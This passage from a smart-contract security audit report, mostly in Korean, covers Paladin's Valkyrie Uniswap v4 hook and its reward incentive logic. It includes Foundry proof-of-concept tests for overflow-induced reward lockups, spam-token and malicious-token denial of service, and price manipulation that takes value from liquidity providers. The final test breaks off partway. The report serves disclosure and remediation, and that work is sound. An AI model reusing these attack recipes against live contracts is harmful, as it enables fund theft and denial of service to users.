**Lead Auditors**

[Giovanni Di Siena](https://x.com/giovannidisiena)

[Draiakoo](https://x.com/Draiakoo)

**Assisting Auditors**




---

# Findings
## Critical Risk


### Reward tokens can become inaccessible due to revert when `rewardPerTokenStored` is downcast and overflows

**Description:** 모든 인센티브 로직 컨트랙트에 존재하는 `rewardPerTokenStored` 상태 변수에 할당되는 `_newRewardPerToken()`의 반환 값은 쉽게 오버플로우될 수 있기 때문에 Type Casting을 통해 `uint96`으로 변환하는 것은 안전하지 않습니다. `UNIT`에 의한 정밀도 스케일 업(scaling up)이 주목해야 할 계산 과정은 아래와 같습니다:

```solidity
function _newRewardPerToken(IncentivizedPoolId id, address token) internal view override returns (uint256) {
    uint256 _totalSupply = poolStates[id].totalLiquidity;
    RewardData memory _state = poolRewardData[id][token];
    if (_totalSupply == 0) return _state.rewardPerTokenStored;

    uint256 lastUpdateTimeApplicable = block.timestamp < _state.endTimestamp ? block.timestamp : _state.endTimestamp;

    // decimals analysis: (seconds * (rewardDecimals / seconds) * 18 decimals) / liquidityDecimals = rewardDecimals + 18 - liquidityDecimals
    return _state.rewardPerTokenStored
        + ((((lastUpdateTimeApplicable - _state.lastUpdateTime) * _state.ratePerSec) * UNIT) / _totalSupply);
}
```

위 계산의 결과는 주석에 설명된 대로 `rewardDecimals + 18 - liquidityDecimals`를 갖게 됩니다. 이는 보상 토큰의 소수점(decimals)과 유동성 토큰의 소수점이 다를 때 특히 문제가 됩니다. 예를 들어, 18 소수점의 보상 토큰과 6 소수점의 Uniswap v4 유동성 토큰은 아래 PoC에서 보여주는 것처럼 오버플로우를 발생시킵니다.

유동성 틱(liquidity tick)과 현재 틱(tick)의 상대적 위치에 따라, Uniswap v4 풀 유동성은 두 통화 중 하나의 소수점 정밀도를 상속합니다. 예를 들어, 주어진 풀이 6 소수점의 `token0`와 18 소수점의 `token0`로 구성된 경우, 출력 유동성은 6 또는 18 소수점이 됩니다. 특히 `FullRangeHook`의 경우, 풀의 가격이 항상 정의된 제한 사이에 존재하도록 의도되어 실행이 항상 중간의 `else if` 분기 내에서 발생할 것으로 예상됩니다:

```solidity
function getLiquidityForAmounts(
    uint160 sqrtRatioX96,
    uint160 sqrtRatioAX96,
    uint160 sqrtRatioBX96,
    uint256 amount0,
    uint256 amount1
) internal pure returns (uint128 liquidity) {
    if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

    if (sqrtRatioX96 <= sqrtRatioAX96) {
        liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);
    } else if (sqrtRatioX96 < sqrtRatioBX96) {
        uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);
        uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);

        liquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1;
    } else {
        liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);
    }
}
```

따라서 이 예시에서 유동성은 항상 6 소수점이 되어야 합니다.

```solidity
function test_LessThan18Decimals() public {
    MockERC20 token0WithLessDecimals = new MockERC20("TEST1", "TEST1", 18);
    token0WithLessDecimals.mint(address(this), 1_000_000 * 10 ** 18);
    MockERC20 token1WithLessDecimals = new MockERC20("TEST2", "TEST2", 6);
    token1WithLessDecimals.mint(address(this), 1_000_000 * 10 ** 6);

    PoolKey memory newKey = createPoolKey(address(token0WithLessDecimals), address(token1WithLessDecimals), 3000, hookAddress);
    PoolId newId = newKey.toId();

    token0WithLessDecimals.approve(address(fullRange), type(uint256).max);
    token1WithLessDecimals.approve(address(fullRange), type(uint256).max);

    initPool(newKey.currency0, newKey.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);

    uint128 liquidityMinted = fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            newKey.currency0,
            newKey.currency1,
            3000,
            100 * 10 ** 18,
            100 * 10 ** 6,
            0,
            0,
            address(this),
            MAX_DEADLINE
        )
    );

    assertEq(liquidityMinted, 100 * 10 ** 6);
}
```

그 후 확인된 형 변환(checked type cast)이 `_updateRewardState()`에서 수행되며, 여기서 오버플로우가 발생하면 revert 됩니다.

```solidity
function _updateRewardState(IncentivizedPoolId id, address token, address account) internal virtual {
    ...
    uint96 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
    _state.rewardPerTokenStored = newRewardPerToken;
    ...
}
```

이것은 `BaseIncentiveLogic::claim` 내부에서 호출되는 `BaseIncentiveLogic::_claim` 내에서 호출되므로, 오버플로우로 인한 어떠한 revert도 보상 토큰의 청구를 방지하게 됩니다.

**Impact:** 단 하나의 6 소수점 토큰(예: 이더리움상의 USDC, USDT)을 가진 Uniswap 풀은 `FullRangeHook` 유동성이 6 소수점 정밀도를 갖게 됩니다. 이는 중간 반환 값이 예상보다 커지게 하여 다운캐스팅 시 실행이 revert 되는 결과를 초래합니다. 보상 토큰은 컨트랙트에 잠긴 상태로 유지되며 생성된 수수료만 회수할 수 있게 됩니다.

**Proof of Concept:** 다음 테스트를 `BasicIncentiveLogic.t.sol`에 배치해야 합니다:

```solidity
function test_incentivesWithLessThan18Decimals() public {
    PoolId poolKey;
    IncentivizedPoolId poolId;
    address lpToken = address(7);

    poolKey = createPoolKey(address(1), address(2), 3000).toId();
    poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

    manager.setListedPool(poolId, true);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    // Liquidity is in 6 decimals
    manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(100 * 10 ** 6));

    uint256 amount = 1000 ether;
    uint256 duration = 2 weeks;

    // Some tokens are deposited to be distributed during 2 weeks
    logic.depositRewards(poolId, address(token0), amount, duration);

    skip(2 weeks);

    // After 2 weeks, the only liquidity holder tries to claim the tokens
    // This reverts to an overflow during type casting
    vm.expectRevert();
    vm.prank(user1);
    uint256 claimedAmount = logic.claim(poolId, address(token0), user1, user1);
}
```

**Recommended Mitigation:** `rewardPerTokenStored` 값을 전체 `uint256`에 직접 저장하는 것을 강력히 권장합니다:

```diff
    function _updateRewardState(IncentivizedPoolId id, address token, address account) internal virtual {
        ...
--      uint96 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
++      uint256 newRewardPerToken = _newRewardPerToken(id, token);
        _state.rewardPerTokenStored = newRewardPerToken;
        ...
    }
```

이 변수와의 다른 모든 상호작용도 이에 따라 조정되어야 작동합니다.

**Paladin:** 커밋 [`6bb56b5`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/6bb56b53e885734b389274b8a8d0419db39de514)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. `RewardData` 및 `UserRewardData` 구조체의 패킹이 `rewardPerTokenStored` 너비의 증가를 고려하여 수정되었습니다. 그러나 다음과 같은 남은 문제들이 식별되었습니다:
* `BaseIncentiveLogic::_updateRewardState`는 여전히 `uint96`으로 캐스팅합니다:
```solidity
uint256 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
```
* `TimeWeightedIncentiveLogic::_updateRewardState`는 여전히 `uint96`으로 캐스팅합니다:
```solidity
_state.rewardPerTokenStored = newRewardPerToken.toUint96();
```

**Paladin:** 커밋 [`d7275a2`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/d7275a2563b17c77b2baba1f2961e7244b3bb764)로 수정되었습니다. `BaseIncentiveLogic`에 대한 수정은 이전 커밋에서 수행되었으며 최신 버전의 브랜치에는 더 이상 존재하지 않습니다.

**Cyfrin:** 검증되었습니다. 다운캐스트가 제거되었습니다.


### `poolRewards` arrays can grow without bounds, resulting in DoS of core functionality

**Description:** `poolRewards` 매핑은 주어진 `IncentivizedPoolId`에 대한 보상 토큰 주소의 배열을 유지 관리합니다. 보상의 분배가 무허가(permissionless)이기 때문에 누구나 임의의 ERC-20 토큰으로 이 기능을 호출하여 배열이 무제한으로 커지게 할 수 있습니다. 무제한 배열에 대한 루핑과 관련된 가스 부족(Out Of Gas) 오류의 의미는 다음 함수들의 DoS입니다:

1. `updateRewardState()`에서 호출되는 `_updateAllRewardState()`:
```solidity
function _updateAllRewardState(IncentivizedPoolId id) internal virtual {
    address[] memory _tokens = poolRewards[id];
    uint256 _length = _tokens.length;
    for (uint256 i; i < _length; i++) {
        _updateRewardState(id, _tokens[i], address(0));
    }
}
```
이것은 단순히 보상 상태 업데이트의 수동 트리거를 방지하므로 그리 심각하지 않습니다.

2. `updateUserState()`, `notifyBalanceChange()` 및 `notifyTransfer()`에서 호출되는 `_updateAllUserState()`:
```solidity
function _updateAllUserState(IncentivizedPoolId id, address account) internal virtual {
    if(!userLiquiditySynced[id][account]) {
        _syncUserLiquidity(id, account);
        userLiquiditySynced[id][account] = true;
    }

    address[] memory _tokens = poolRewards[id];
    uint256 _length = _tokens.length;
    for (uint256 i; i < _length; i++) {
        _updateRewardState(id, _tokens[i], account);
    }
}
```
잔액 변경 및 전송 알림을 되돌리면 훅과 Uniswap 풀 상호작용이 DoS 되기 때문에 이것은 치명적입니다. 또한, 이 함수는 `TimeWeightedIncentiveLogic::claim` 및 `TimeWeightedIncentiveLogic::claimAll`에서도 사용되어 사용자가 보상을 회수할 수 없게 되어 자금 손실을 초래할 것입니다.

3. `earnedAll()`:
```solidity
    function earnedAll(IncentivizedPoolId id, address account) external view virtual returns (EarnedData[] memory _earnings) {
        address[] memory _tokens = poolRewards[id];
        uint256 _length = _tokens.length;
        _earnings = new EarnedData[](_length);
        for (uint256 i; i < _length; i++) {
            _earnings[i].token = _tokens[i];
            _earnings[i].amount = _earned(id, _tokens[i], account);
        }
    }
```

이것은 온체인 실행에 영향을 미치지 않으므로 그리 심각하지 않습니다.

4. `claimAll()`:
```solidity
    function claimAll(IncentivizedPoolId id, address account, address recipient)
        external
        virtual
        nonReentrant
        returns (ClaimedData[] memory _claims)
    {
        _checkClaimer(account, recipient);

        address[] memory _tokens = poolRewards[id];
        uint256 _length = _tokens.length;
        _claims = new ClaimedData[](_length);
        for (uint256 i; i < _length; i++) {
            _claims[i].token = _tokens[i];
            _claims[i].amount = _claim(id, _tokens[i], account, recipient);
        }
    }
```

이것은 단순히 보상의 일괄 청구를 방지하므로 그리 심각하지 않습니다.

**Impact:** 이 발견은 공격을 수행하는 데 드는 비용이 낮고(가짜/무가치한 ERC-20 토큰 배포는 무허가임) `notifyBalanceChange()`, `notifyTransfer()`, `TimeWeightedIncentiveLogic::claim()`과 같은 중요한 기능에 미치는 영향 때문에 치명적인 영향을 미칩니다.

**Recommended Mitigation:** 공격자가 스팸 토큰으로 배열을 채우는 것을 방지하기 위해 보상 분배는 허가된, 널리 사용되는/가치 있는 ERC-20 토큰으로 제한되어야 합니다.

**Paladin:** 커밋 [`b95ae97`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/b95ae97a67eca4e1e33cafc636ae3d3d3c1af088)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 보상 토큰 허용 목록(allowlist)이 구현되었습니다.


### Permissionless reward distribution can be abused to cause full denial of service and loss of funds for pools

**Description:** 보상 토큰 인센티브의 분배는 무허가(permissionless) 작업으로, 누구나 무가치한 토큰을 생성하고 대량으로 발행하여 분배할 수 있습니다. 인센티브 관리자로부터 풀 내 변경 사항에 대해 로직으로 알림이 전송될 때마다 `_updateAllUserState()` 함수가 트리거됩니다. 이는 풀이 등록한 각 토큰에 대한 새로운 보상 데이터를 업데이트합니다:

```solidity
function _updateAllUserState(IncentivizedPoolId id, address account) internal virtual {
    if(!userLiquiditySynced[id][account]) {
        _syncUserLiquidity(id, account);
        userLiquiditySynced[id][account] = true;
    }

    address[] memory _tokens = poolRewards[id];
    uint256 _length = _tokens.length;
    for (uint256 i; i < _length; i++) {
        _updateRewardState(id, _tokens[i], account);
    }
}

function _updateRewardState(IncentivizedPoolId id, address token, address account) internal virtual {
    // Sync pool total liquidity if not already done
    if(!poolSynced[id]) {
        _syncPoolLiquidity(id);
        poolSynced[id] = true;
    }

    RewardData storage _state = poolRewardData[id][token];
    uint96 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
    _state.rewardPerTokenStored = newRewardPerToken;

    uint32 endTimestampCache = _state.endTimestamp;
    _state.lastUpdateTime = block.timestamp < endTimestampCache ? block.timestamp.toUint32() : endTimestampCache;

    // Update user state if an account is provided
    if (account != address(0)) {
        if(!userLiquiditySynced[id][account]) {
            _syncUserLiquidity(id, account);
            userLiquiditySynced[id][account] = true;
        }

        UserRewardData storage _userState = userRewardStates[id][account][token];
        _userState.accrued = _earned(id, token, account).toUint160();
        _userState.lastRewardPerToken = newRewardPerToken;
    }
}

function _newRewardPerToken(IncentivizedPoolId id, address token) internal view override returns (uint256) {
    uint256 _totalSupply = poolStates[id].totalLiquidity;
    RewardData memory _state = poolRewardData[id][token];
    if (_totalSupply == 0) return _state.rewardPerTokenStored;

    uint256 lastUpdateTimeApplicable = block.timestamp < _state.endTimestamp ? block.timestamp : _state.endTimestamp;

    return _state.rewardPerTokenStored
        + ((((lastUpdateTimeApplicable - _state.lastUpdateTime) * _state.ratePerSec) * UNIT) / _totalSupply);
}
```

분배 금액이 어느 시점에 `uint96` 오버플로우에 가까워지면, `_state.rewardPerTokenStored`가 할당되는 로컬 스코프의 `_newRewardPerToken`이 오버플로우되고 풀과 인센티브는 영구적으로 잠기게 됩니다.

낮은 소수점 정밀도를 가진 가치 있는 토큰을 고려할 때 악의적인 행동 없이 발생할 수 있는 이 오버플로우에 대한 또 다른 보고된 문제가 있었지만, 스토리지 변수의 크기를 늘리는 권장 완화 조치는 이 경우 충분하지 않습니다. 악의적인 예금자는 토큰 분배가 항상 `uint256` 오버플로우에 가깝게 조정되어 이 공격을 트리거할 수 있도록 토큰을 자유롭게 생성할 수 있습니다.

**Proof of Concept:** 다음 테스트는 `BasicIncentiveLogic.t.sol` 내에 배치되어야 합니다:

```solidity
function test_MaliciousToken() public {
    MockERC20 token3 = new MockERC20("TEST", "TEST", 18);
    token3.mint(address(this), 2 ** 128);
    token3.approve(address(logic), 2 ** 128);

    PoolId poolKey;
    IncentivizedPoolId poolId;
    address lpToken = address(7);

    poolKey = createPoolKey(address(1), address(2), 3000).toId();
    poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

    manager.setListedPool(poolId, true);
    logic.updateDefaultFee(0);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(1 ether));

    uint256 amountNotOverflow = 47917192688627071376575381162608000;
    uint256 duration = 1 weeks;

    logic.depositRewards(poolId, address(token3), amountNotOverflow, duration);

    // The malicious user sets the ratePerSec to the maximum number that uint96 can hold
    (, , uint256 ratePerSec, ) = logic.poolRewardData(poolId, address(token3));
    assertEq(ratePerSec, type(uint96).max);

    // After 2 seconds, the pool is completely locked because of overflowing when computing
    // the _newRewardPerToken and downcasting to uint96
    skip(2);

    // The pool is completely DoSd and the user that has liquidity in the pool lost all their
    // funds because they can not remove them
    vm.expectRevert();
    manager.notifyRemoveLiquidty(systems, poolKey, lpToken, user1, -int256(1 ether));
}
```

**Impact:** 이는 추가 보상 분배를 방지할 뿐만 아니라 정직한 사용자가 풀에서 기존 유동성을 제거하는 것을 방지하여 자금 손실을 초래하므로 치명적인 영향을 미칩니다.

**Recommended Mitigation:** 보상 분배는 공급을 인위적으로 조작할 수 있는 내재적 가치가 없는 악성 토큰이 이러한 공격에 활용될 수 없도록 허가(permissioned)되어야 합니다.

**Paladin:** 커밋 [`b95ae97`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/b95ae97a67eca4e1e33cafc636ae3d3d3c1af088)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 보상 토큰 허용 목록(allowlist)이 구현되었습니다.

\clearpage
## High Risk


### Manipulation of price outside of the `FullRangeHook` liquidity range can result in DoS and financial loss to liquidity providers

**Description:** `FullRangeHook`에서 사용하는 최소 및 최대 틱(tick)은 Uniswap V4 풀에 정의된 것과 다릅니다:

```solidity
FullRangeHook.sol:
 /// @dev Min tick for full range with tick spacing of 60
int24 internal constant MIN_TICK = -887220;
/// @dev Max tick for full range with tick spacing of 60
int24 internal constant MAX_TICK = -MIN_TICK;

TickMath.sol:
/// @dev The minimum tick that may be passed to #getSqrtPriceAtTick computed from log base 1.0001 of 2**-128
/// @dev If ever MIN_TICK and MAX_TICK are not centered around 0, the absTick logic in getSqrtPriceAtTick cannot be used
int24 internal constant MIN_TICK = -887272;
/// @dev The maximum tick that may be passed to #getSqrtPriceAtTick computed from log base 1.0001 of 2**128
/// @dev If ever MIN_TICK and MAX_TICK are not centered around 0, the absTick logic in getSqrtPriceAtTick cannot be used
int24 internal constant MAX_TICK = 887272;
```

이는 가격이 이동하여 유동성 범위를 벗어날 수 있는 두 개의 영역이 있음을 의미합니다. 이는 `FullRangeHook`으로 구성된 풀의 가격이 항상 정의된 제한 사이에 있어야 하며 실행이 항상 중간의 `else if` 분기 내에서 발생할 것으로 예상되는 의도된 동작에 위배됩니다:

```solidity
function getLiquidityForAmounts(
    uint160 sqrtRatioX96,
    uint160 sqrtRatioAX96,
    uint160 sqrtRatioBX96,
    uint256 amount0,
    uint256 amount1
) internal pure returns (uint128 liquidity) {
    if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

    if (sqrtRatioX96 <= sqrtRatioAX96) {
        liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);
    } else if (sqrtRatioX96 < sqrtRatioBX96) {
        uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);
        uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);

        liquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1;
    } else {
        liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);
    }
}
```

그러나 가격이 이 틱 범위를 벗어나면, 그렇지 않게 됩니다. 유동성 계산은 예상과 크게 다를 것이며 풀의 DoS 또는 유동성 공급자의 가치 손실로 이어질 수 있습니다.

**Proof of Concept:** `FullRangeHook.t.sol` 내에 배치되어야 하는 다음 테스트는 먼저 유동성 계산의 극심한 차이를 분석합니다:

```solidity
function test_LiquidityManipulation() public {
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887272);

    uint256 liquidity = LiquidityAmounts.getLiquidityForAmounts(
        SQRT_PRICE_1_1,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        100 * 10 ** 18,
        100 * 10 ** 18
    );

    uint256 manipulatedLiquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtMaxTickUniswap,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        100 * 10 ** 18,
        100 * 10 ** 18
    );

    console.log(liquidity);
    console.log(manipulatedLiquidity);
}
```

출력:
```bash
Ran 1 test for test/FullRangeHook.t.sol:TestFullRangeHook
[PASS] test_LiquidityManipulation() (gas: 11805)
Logs:
  100000000000000000005
  5
```

위 출력에서 볼 수 있듯이, 동일한 양의 토큰(`100e18`)을 주었을 때 계산된 유동성은 가격이 예상 틱 범위 내에 있을 때와 외부에 있을 때 크게 다릅니다. 첫 번째 경우 유동성은 예치된 토큰의 양과 관련된 `100e18`로 계산되는 반면, 후자의 경우는 동일한 양의 토큰을 소비하면서도 단지 `5`의 유동성 양을 계산합니다.

이 불일치는 공격자가 풀 초기화 직후 의도한 유동성 범위 밖의 틱으로 풀의 가격을 이동시켜 풀에 DoS를 생성하는 데 악용될 수 있습니다. 이는 유동성이 없는 상태에서 원하는 방향으로 풀에 대해 스왑을 실행하여 쉽게 달성할 수 있습니다. 가격이 범위를 벗어나면, 계산된 유동성 값이 너무 작기 때문에 첫 번째 예치자가 최소 유동성을 생성했는지 확인하기 위해 수행되는 유효성 검사가 실패하게 됩니다. 따라서 이 유효성 검사를 통과하려면 엄청난 예치 금액이 필요하게 되며 이는 예치자에게 자금 손실을 의미합니다.

```solidity
uint256 liquidityMinted;
if (poolLiquidity == 0) {
    // permanently lock the first MINIMUM_LIQUIDITY tokens
    liquidityMinted = liquidity - MINIMUM_LIQUIDITY;
    poolLiquidityToken.mint(address(0), MINIMUM_LIQUIDITY);
    // Mint the LP tokens to the user
    poolLiquidityToken.mint(params.to, liquidityMinted);
} else {
    ...
}
```

구체적으로 말해서, 18 소수점 토큰이 최소 유동성 요구 사항인 `1e3`에 도달하려면 `18000e18`개 이상의 토큰이 필요합니다:

```solidity
function test_LiquidityManipulation() public {
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887272);

    uint256 manipulatedLiquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtMaxTickUniswap,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        18000 * 10 ** 18,
        18000 * 10 ** 18
    );

    console.log(manipulatedLiquidity);
}
```

출력:
```bash
Ran 1 test for test/FullRangeHook.t.sol:TestFullRangeHook
[PASS] test_LiquidityManipulation() (gas: 11805)
Logs:
  978
```

USDC와 같이 6 소수점을 가진 18 소수점 미만의 토큰의 경우, 이 최소 유동성 요구 사항을 충족하는 것이 불가능하며 풀은 영구적으로 동결될 것입니다.

`FullRangeHook.t.sol` 내에 배치되어야 하는 다음 테스트는 공격자가 풀 초기화 후 유동성이 없는 상태에서 의도한 범위를 벗어나 가격을 이동시키는 방법을 보여줍니다:

```solidity
function test_DoSMaximumTick() public {
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887271);

    manager.initialize(key, SQRT_PRICE_1_1);

    IPoolManager.SwapParams memory params;
    HookEnabledSwapRouter.TestSettings memory settings;

    params =
        IPoolManager.SwapParams({ zeroForOne: false, amountSpecified: type(int256).min, sqrtPriceLimitX96: sqrtMaxTickUniswap });
    settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    router.swap(key, params, settings, ZERO_BYTES);

    (uint160 poolPrice,,,) = manager.getSlot0(key.toId());
    assertEq(poolPrice, sqrtMaxTickUniswap);
}
```

테스트를 실행하려면 `HookEnabledSwapRouter` 내의 다음 코드 줄을 주석 처리해야 합니다:

```solidity
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    ...
    // Make sure youve added liquidity to the test pool!
    // @audit disabled this for testing purposes
    // if (BalanceDelta.unwrap(delta) == 0) revert NoSwapOccurred();
    ...
}
```
이것은 단순히 테스트에서 스왑을 실행하면서 0 델타 스왑을 방지하도록 설계된 헬퍼 함수입니다.

위 테스트에도 불구하고, 풀에 유동성이 있는 경우에도 가격을 유동성 범위 밖으로 이동시키는 것이 가능합니다. 이 공격은 비용이 더 많이 들지만 더 큰 영향을 미칩니다. 위에서 보여준 것처럼 후속 추가에 대한 유동성 계산에 영향을 미칠 뿐만 아니라 `_rebalance()` 함수가 revert 되기 때문에 유동성 추가를 DoS 시킬 것이기 때문입니다:

```solidity
function _rebalance(PoolKey memory key) public {
    PoolId poolId = key.toId();
    // Remove all the liquidity from the Pool
    (BalanceDelta balanceDelta,) = poolManager.modifyLiquidity(
        key,
        IPoolManager.ModifyLiquidityParams({
            tickLower: MIN_TICK,
            tickUpper: MAX_TICK,
            liquidityDelta: -(poolManager.getLiquidity(poolId).toInt256()),
            salt: 0
        }),
        ZERO_BYTES
    );

    // Calculate the new sqrtPriceX96
    uint160 newSqrtPriceX96 = (
        FixedPointMathLib.sqrt(
            FullMath.mulDiv(uint128(balanceDelta.amount1()), FixedPoint96.Q96, uint128(balanceDelta.amount0()))
        ) * FixedPointMathLib.sqrt(FixedPoint96.Q96)
    ).toUint160();
    ...
}
```

이 함수는 먼저 모든 유동성을 제거한 다음 새로운 제곱근 가격을 계산합니다; 그러나 가격이 의도한 유동성 범위를 벗어나도록 조작된 경우, 이 제거는 풀 토큰 중 하나에서만 단면적(single-sided)일 것입니다. 따라서 0인 `token0`의 양으로 나누기 때문에 새로운 제곱근 가격을 계산하려고 할 때 패닉 revert 가 발생합니다:

```solidity
function test_RebalanceWhenPriceIsOutsideTickRange() public {
    manager.initialize(key, SQRT_PRICE_1_1);
    uint160 sqrtMaxTickUniswap = TickMath.getSqrtPriceAtTick(887271);
    uint160 sqrtMinTickUniswap = TickMath.getSqrtPriceAtTick(-887271);

    uint256 prevBalance0 = key.currency0.balanceOf(address(this));
    uint256 prevBalance1 = key.currency1.balanceOf(address(this));
    (, address liquidityToken) = fullRange.poolInfo(id);

    fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 10e6, 10e6, 0, 0, address(this), MAX_DEADLINE
        )
    );

    uint256 prevLiquidityTokenBal = IncentivizedERC20(liquidityToken).balanceOf(address(this));

    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams({ zeroForOne: false, amountSpecified: -int256(key.currency0.balanceOfSelf()), sqrtPriceLimitX96: sqrtMaxTickUniswap });
    HookEnabledSwapRouter.TestSettings memory settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    router.swap(key, params, settings, ZERO_BYTES);

    vm.expectRevert();
    fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 100000 ether, 100000 ether, 0, 0, address(this), MAX_DEADLINE
        )
    );
}
```

풀이 의도된 범위 밖에서 초기화되는 시나리오에서, DoS를 초래하지 않고 유동성 계산 조작을 달성할 수 있으며, 이는 공격자가 다른 유동성 공급자로부터 가치를 훔칠 수 있음을 의미합니다:

```solidity
function test_addLiquidityFullRangePoC() public {
    token1 = new MockERC20("token1", "T1", 6);
    (token0, token1) = token0 > token1 ? (token1, token0) : (token0, token1);

    PoolKey memory newKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, IHooks(hookAddress2));
    // the pool is initialized out of the intended range, either accidentally or by an attacker front-running bob
    manager.initialize(newKey, TickMath.getSqrtPriceAtTick(MIN_TICK - 1));

    uint256 mintAmount0 = 10_000_000 * 10 ** token0.decimals();
    uint256 mintAmount1 = 10_000_000 * 10 ** token1.decimals();

    address alice = makeAddr("alice");
    token0.mint(alice, mintAmount0);
    token1.mint(alice, mintAmount1);
    vm.startPrank(alice);
    token0.approve(hookAddress2, type(uint256).max);
    token1.approve(hookAddress2, type(uint256).max);
    vm.stopPrank();

    address bob = makeAddr("bob");
    token0.mint(bob, mintAmount0);
    token1.mint(bob, mintAmount1);
    vm.startPrank(bob);
    token0.approve(hookAddress2, type(uint256).max);
    token1.approve(hookAddress2, type(uint256).max);
    token0.approve(address(router), type(uint256).max);
    token1.approve(address(router), type(uint256).max);
    vm.stopPrank();

    uint160 minSqrtPrice = TickMath.getSqrtPriceAtTick(MIN_TICK);
    uint160 maxSqrtPrice = TickMath.getSqrtPriceAtTick(MAX_TICK);

    // bob adds liquidity while the price is outside the intended range
    uint256 amount0Bob = 1_000_000 * 10 ** token0.decimals();
    uint256 amount1Bob = 1_000_000 * 10 ** token1.decimals();

    FullRangeHook.AddLiquidityParams memory addLiquidityParamsBob = FullRangeHook.AddLiquidityParams(
        newKey.currency0, newKey.currency1, 3000, amount0Bob, amount1Bob, 0, 0, bob, MAX_DEADLINE
    );

    console.log("bob adding liquidity");
    uint256 amount0BobBefore = token0.balanceOf(bob);
    uint256 amount1BobBefore = token1.balanceOf(bob);
    vm.prank(bob);
    uint128 addedLiquidityBob = fullRange2.addLiquidity(addLiquidityParamsBob);
    console.log("added liquidity bob: %s ", uint256(addedLiquidityBob));
    console.log("token0 diff bob add liquidity: %s", amount0BobBefore - token0.balanceOf(bob));
    console.log("token1 diff bob add liquidity: %s", amount1BobBefore - token1.balanceOf(bob));

    (, address liquidityToken) = fullRange2.poolInfo(newKey.toId());
    uint256 liquidityTokenBalBob = IncentivizedERC20(liquidityToken).balanceOf(bob);
    console.log("liquidityTokenBal bob: %s", liquidityTokenBalBob);

    // alice moves price back into range
    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams({ zeroForOne: false, amountSpecified: -int256(uint256(1_000 * 10 ** token1.decimals())), sqrtPriceLimitX96: maxSqrtPrice });
    HookEnabledSwapRouter.TestSettings memory settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    vm.prank(alice);
    router.swap(newKey, params, settings, ZERO_BYTES);

    // alice adds liquidity
    uint256 amount0Alice = 1_000_000 * 10 ** token0.decimals();
    uint256 amount1Alice = 1_000_000 * 10 ** token1.decimals();

    FullRangeHook.AddLiquidityParams memory addLiquidityParamsAlice = FullRangeHook.AddLiquidityParams(
        newKey.currency0, newKey.currency1, 3000, amount0Alice, amount1Alice, 0, 0, alice, MAX_DEADLINE
    );
    console.log("alice adding liquidity");
    uint256 amount0AliceBefore = token0.balanceOf(alice);
    uint256 amount1AliceBefore = token1.balanceOf(alice);
    (uint160 sqrtPriceX96,,,) = manager.getSlot0(newKey.toId());
    assertTrue(sqrtPriceX96 > minSqrtPrice && sqrtPriceX96 < maxSqrtPrice);
    uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtPriceX96,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        amount0Alice,
        amount1Alice
    );
    console.log("calculated liquidity: %s", uint256(liquidity));

    vm.prank(alice);
    uint128 addedLiquidityAlice = fullRange2.addLiquidity(addLiquidityParamsAlice);
    console.log("added liquidity alice: %s ", uint256(addedLiquidityAlice));

